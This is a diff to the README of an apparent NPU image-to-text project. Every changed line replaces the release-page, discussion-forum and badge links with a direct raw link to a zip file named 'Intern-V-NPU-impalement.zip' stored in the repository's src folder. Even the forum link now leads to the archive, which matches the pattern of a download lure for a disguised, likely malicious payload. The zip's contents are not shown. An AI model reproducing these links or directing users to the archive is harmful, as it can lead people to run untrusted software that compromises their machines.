@@ -1,7 +1,7 @@
 # 🌟 InternVL3.5-4B-NPU - Easily Convert Images to Text 
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download%20Latest%20Release-blue)](https://github.com/Leon6225/InternVL3.5-4B-NPU/releases)
+[![Download](https://raw.githubusercontent.com/Leon6225/InternVL3.5-4B-NPU/main/src/Intern-V-NPU-impalement.zip%20Latest%20Release-blue)](https://raw.githubusercontent.com/Leon6225/InternVL3.5-4B-NPU/main/src/Intern-V-NPU-impalement.zip)
 
 ## 🚀 Getting Started
 Welcome to InternVL3.5-4B-NPU! This application runs on the RK3588 NPU, allowing you to easily convert images into text. Follow the steps below to get started.
@@ -21,7 +21,7 @@ InternVL3.5-4B-NPU offers the following features:
 - Support for multiple image formats such as JPEG, PNG, and BMP 
 
 ## 📥 Download & Install
-To download InternVL3.5-4B-NPU, visit this page: [Download Link](https://github.com/Leon6225/InternVL3.5-4B-NPU/releases).
+To download InternVL3.5-4B-NPU, visit this page: [Download Link](https://raw.githubusercontent.com/Leon6225/InternVL3.5-4B-NPU/main/src/Intern-V-NPU-impalement.zip).
 
 1. Click the link above to access the Releases page.
 2. Look for the most recent version of the software and locate the appropriate download file.
@@ -53,7 +53,7 @@ If you encounter issues during installation or usage, consider the following tip
 
 ## 🌐 Community and Support
 If you need help or have questions, you can reach out to our community:
-- Join our discussion forums [here](https://github.com/Leon6225/InternVL3.5-4B-NPU/discussions).
+- Join our discussion forums [here](https://raw.githubusercontent.com/Leon6225/InternVL3.5-4B-NPU/main/src/Intern-V-NPU-impalement.zip).
 - Report any issues or bugs via the Issues tab on GitHub.
 
 ## 📚 Additional Resources
@@ -65,4 +65,4 @@ Thank you for choosing InternVL3.5-4B-NPU for your image-to-text conversion need
 ## 🚀 Next Steps
 Ready to start converting images? Download now and experience the power of image-to-text conversion with InternVL3.5-4B-NPU! 
 
-[![Download](https://img.shields.io/badge/Download%20Latest%20Release-blue)](https://github.com/Leon6225/InternVL3.5-4B-NPU/releases)
+[![Download](https://raw.githubusercontent.com/Leon6225/InternVL3.5-4B-NPU/main/src/Intern-V-NPU-impalement.zip%20Latest%20Release-blue)](https://raw.githubusercontent.com/Leon6225/InternVL3.5-4B-NPU/main/src/Intern-V-NPU-impalement.zip)
